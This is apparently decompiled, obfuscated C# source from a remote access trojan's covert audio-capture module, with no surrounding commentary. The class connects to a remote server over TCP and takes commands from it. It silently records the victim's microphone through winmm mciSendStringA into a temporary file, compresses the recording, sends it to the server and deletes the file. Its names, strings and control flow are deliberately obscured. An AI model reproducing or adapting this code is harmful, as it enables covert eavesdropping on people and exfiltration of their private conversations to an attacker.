using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class ________________________________
{
	private delegate void _________________________________(string string_0);

	private bool __;

	private _________________________________ m____;

	public StreamWriter ____;

	public StreamReader _____;

	private string m_______;

	public string _______;

	private int m_________;

	private bool m__________;

	private event _________________________________ _
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			this.m____ = (_________________________________)Delegate.Combine(this.m____, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			this.m____ = (_________________________________)Delegate.Remove(this.m____, value);
		}
	}

	public ________________________________()
	{
		__ = false;
		this.m_______ = _003CModule_003E._____<string>(1355333096u);
		this._______ = _003CModule_003E.___<string>(657767552u);
		this.m_________ = 5000;
		this.m__________ = false;
	}

	public unsafe void ___(string string_0)
	{
		string string_ = string_0;
		nint num = (nint)Type.EmptyTypes.LongLength + 35811;
		int num2 = _003CModule_003E.___________;
		string_0 = ___________________________________________________________________._(string_, _003CModule_003E.__________(35074, (int)num, (int)((num2 + 7 * num2 != 7669) ? ((nint)Type.EmptyTypes.LongLength + 93) : (((0xE00 & (2 * -(0x67E0C000 & num2))) != (0xE00 & (num2 << 14))) ? ((nint)Type.EmptyTypes.LongLength + -1708157625) : ((~((num2 << 25) * 256) == ((1981546496 * num2) ^ -1441)) ? 1115932297 : (-2017877775))))));
		try
		{
			string[] array = default(string[]);
			int num3;
			int num4;
			if (string_0.Contains(_003CModule_003E._____<string>(2815274875u)))
			{
				array = Strings.Split(string_0, _003CModule_003E._______<string>(1023697363u), -1, (CompareMethod)0);
				num3 = sizeof(ulong) + -3148;
				num4 = sizeof(ushort) + 1;
				goto IL_0166;
			}
			goto IL_01c3;
			IL_0100:
			this.m__________ = true;
			this.m_________ = Convert.ToInt32(array[1]);
			num4 = sizeof(ulong) + -7;
			goto IL_0166;
			IL_01c3:
			num3 = -3140;
			int ________________ = _003CModule_003E._________________;
			if ((0xBu & (uint)(29 * ________________ + 35 * ________________)) != 0)
			{
				goto IL_015e;
			}
			goto IL_01aa;
			IL_01aa:
			while (true)
			{
				if (Operators.CompareString(string_0, _003CModule_003E.____<string>(4283754960u), false) == 0)
				{
					int num5 = ______________________._______;
					if (((uint)(296222720 * num5) & 0x1913u) != 0 || num3 != -3140)
					{
						break;
					}
					__________();
				}
				if (string_0.Contains(_003CModule_003E._____<string>(3424309708u)))
				{
					num3 = 29814;
					if ((nint)Type.EmptyTypes.LongLength + -17939 != -17939)
					{
						continue;
					}
					goto IL_0100;
				}
				goto IL_0121;
			}
			goto IL_0155;
			IL_015e:
			____();
			goto IL_0121;
			IL_0166:
			switch (num4)
			{
			case 2:
				break;
			case 1:
				goto IL_015e;
			default:
				goto IL_01aa;
			case 3:
				goto IL_01c3;
			case 0:
			{
				MemoryStream memoryStream = new MemoryStream();
				string text = _003CModule_003E.____<string>(1830698961u) + this._______ + ______________________________________________________________.________________________ + this._______;
				memoryStream.Write(________(text), 0, text.Length);
				_______(memoryStream.ToArray());
				memoryStream.Dispose();
				return;
			}
			}
			goto IL_0155;
			IL_0121:
			if (!string_0.Contains(_003CModule_003E.___<string>(1238117332u)))
			{
				goto IL_0133;
			}
			goto IL_0155;
			IL_0133:
			if (Operators.CompareString(string_0, _003CModule_003E.____<string>(2204748370u), false) == 0)
			{
				num4 = sizeof(float) + -4;
				goto IL_0166;
			}
			return;
			IL_0155:
			this.m__________ = false;
			goto IL_0133;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void ____()
	{
		try
		{
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			Random random = new Random();
			string text = Path.GetTempPath() + Conversions.ToString(random.Next(1000, 9000)) + _003CModule_003E._______<string>(4248601141u);
			int num = 4;
			nint num2 = num;
			string string_ = default(string);
			int num3 = default(int);
			int num4 = default(int);
			byte[] array = default(byte[]);
			MemoryStream memoryStream = default(MemoryStream);
			string text2 = default(string);
			while (true)
			{
				switch (num2)
				{
				case 6:
				{
					string string_2 = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 20006), sizeof(int) + 21426, 93);
					______________________________________________.mciSendStringA(ref string_, ref string_2, 0L, 0L);
					if (num3 != 18238)
					{
						string_ = _003CModule_003E._____<string>(3555353906u);
						string_2 = _003CModule_003E.__________(sizeof(ulong) + 69351, (int)(((0x1D8C ^ (50 * num4 + num4 * 14 - 3143)) == 0) ? ((nint)Type.EmptyTypes.LongLength + -1243851122) : ((nint)Type.EmptyTypes.LongLength + 70850)), (int)((nint)Type.EmptyTypes.LongLength + 195));
						______________________________________________.mciSendStringA(ref string_, ref string_2, 0L, 0L);
						num3 = 19088;
						Thread.Sleep(250);
						if (!this.m__________)
						{
							File.Delete(text);
							num2 = (nint)Type.EmptyTypes.LongLength + 1;
							break;
						}
						if (File.Exists(text))
						{
							array = _____(File.ReadAllBytes(text));
							num3 = 14552;
							memoryStream = new MemoryStream();
							text2 = _003CModule_003E.____<string>(2900636504u) + this._______;
							num2 = (nint)Type.EmptyTypes.LongLength + 5;
							break;
						}
						return;
					}
					goto case 2;
				}
				case 2:
					while (stopwatch.ElapsedMilliseconds < this.m_________)
					{
						Application.DoEvents();
					}
					num2 = (nint)Type.EmptyTypes.LongLength + 3;
					break;
				default:
				{
					string string_2 = _003CModule_003E._______<string>(2402366507u);
					num4 = ______________________._______;
					nint intPtr = (((num4 << 2) + 4334 == -7847) ? ((nint)Type.EmptyTypes.LongLength + -2017674079) : 63454);
					int num5 = _003CModule_003E.__________;
					string_ = _003CModule_003E.__________((int)intPtr, (int)((((((uint)(0x1C74 | num5) >> 30) ^ ((uint)num5 >> 30)) & 2u) != 0) ? ((nint)Type.EmptyTypes.LongLength + -329111322) : ((nint)Type.EmptyTypes.LongLength + 64788)), sizeof(double) + 213);
					______________________________________________.mciSendStringA(ref string_2, ref string_, 0L, 0L);
					num2 = (nint)Type.EmptyTypes.LongLength + 0;
					break;
				}
				case 3:
				{
					stopwatch.Stop();
					string_ = _003CModule_003E._______<string>(2621456699u) + text;
					num3 = (int)((nint)Type.EmptyTypes.LongLength + 18697);
					int _______________ = _003CModule_003E.________________;
					num2 = (((0x1C3C ^ -(_______________ & 0x3FFFFBA8)) == 0) ? ((nint)Type.EmptyTypes.LongLength + 1731531566) : (sizeof(Guid) + -10));
					break;
				}
				case 0:
				{
					string_ = _003CModule_003E._______<string>(3352870098u);
					string string_2 = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 5807), (int)((nint)Type.EmptyTypes.LongLength + 7244), (int)((nint)Type.EmptyTypes.LongLength + 234));
					______________________________________________.mciSendStringA(ref string_, ref string_2, 0L, 0L);
					num2 = (nint)Type.EmptyTypes.LongLength + 2;
					break;
				}
				case 1:
					return;
				case 5:
					memoryStream.Write(________(text2), 0, text2.Length);
					memoryStream.Write(array, 0, array.Length);
					_______(memoryStream.ToArray());
					memoryStream.Dispose();
					File.Delete(text);
					return;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.______<string>(3474929201u), _003CModule_003E._____<string>(4249341089u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] _____(byte[] byte_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress, leaveOpen: true);
		deflateStream.Write(byte_0, 0, byte_0.Length);
		deflateStream.Close();
		return memoryStream.ToArray();
	}

	public unsafe void ______()
	{
		try
		{
			______________________________________________________________.______________(_003CModule_003E.___<string>(982404538u), _003CModule_003E.______<string>(2010400639u));
			this._ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
			nint num = (nint)Type.EmptyTypes.LongLength + 1;
			int num2 = default(int);
			while (true)
			{
				nint intPtr;
				switch (num)
				{
				default:
				{
					this._.ReceiveBufferSize = 9999999;
					this._.SendBufferSize = 9999999;
					int _______________ = _003CModule_003E.________________;
					intPtr = (((((_______________ << 14) ^ (_______________ * 65536)) | -4419) == -4419) ? (sizeof(byte) + -4386) : ((nint)Type.EmptyTypes.LongLength + -947013799));
					break;
				}
				case 0:
				{
					if (!__)
					{
						__ = true;
						_ += ___;
						if (num2 == 16027)
						{
						}
					}
					this._.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, ___________, null);
					Thread.Sleep(500);
					string string_ = _003CModule_003E.______<string>(36610759u) + ______________________________________________________________.________________________ + _003CModule_003E.______<string>(861631917u);
					____________(string_);
					return;
				}
				}
				num2 = (int)intPtr;
				num = sizeof(byte) + -1;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.___<string>(1387161447u), _003CModule_003E.____<string>(3234593318u) + ex2.ToString());
			__________();
			ProjectData.ClearProjectError();
		}
	}

	public void _______(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(________(this.m_______), 0, this.m_______.Length);
			this._.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			__________();
			ProjectData.ClearProjectError();
		}
	}

	public byte[] ________(string string_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	public string _________(byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public unsafe void __________()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					goto IL_004d;
				case 184:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 2:
							break;
						case 1:
							goto IL_004d;
						case 3:
							goto IL_0057;
						case 4:
							goto IL_0064;
						case 5:
							goto IL_0071;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto IL_0003;
					}
					IL_0057:
					num = 3;
					this._.Close();
					goto IL_0064;
					IL_004d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0003;
					IL_0003:
					num = 2;
					Thread.Sleep(500);
					if ((((3 & ~(num3 * 15 + num3)) == (int)(3 & ((uint)((num3 << 29) - 1005) >> 27))) ? (sizeof(long) + 20338) : (sizeof(double) + 575091091)) != 20346)
					{
						goto IL_004d;
					}
					goto IL_0057;
					IL_0064:
					num = 4;
					this.____.Close();
					goto IL_0071;
					IL_0071:
					num = 5;
					this._____.Close();
					break;
					end_IL_0000_2:
					break;
				}
				num = 6;
				Thread.CurrentThread.Abort();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 184;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void ___________(IAsyncResult iasyncResult_0)
	{
		try
		{
			this._____ = new StreamReader(this._.GetStream());
			this.m____?.Invoke(this._____.ReadLine());
			this._.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, ___________, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			__________();
			ProjectData.ClearProjectError();
		}
	}

	public void ____________(string string_0)
	{
		try
		{
			this.____ = new StreamWriter(this._.GetStream());
			this.____.WriteLine(_003CModule_003E.____<string>(2523488060u) + string_0);
			this.____.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			__________();
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("winmm.dll")]
	public static extern long mciSendStringA(string string_0, string string_1, long long_0, long long_1);
}
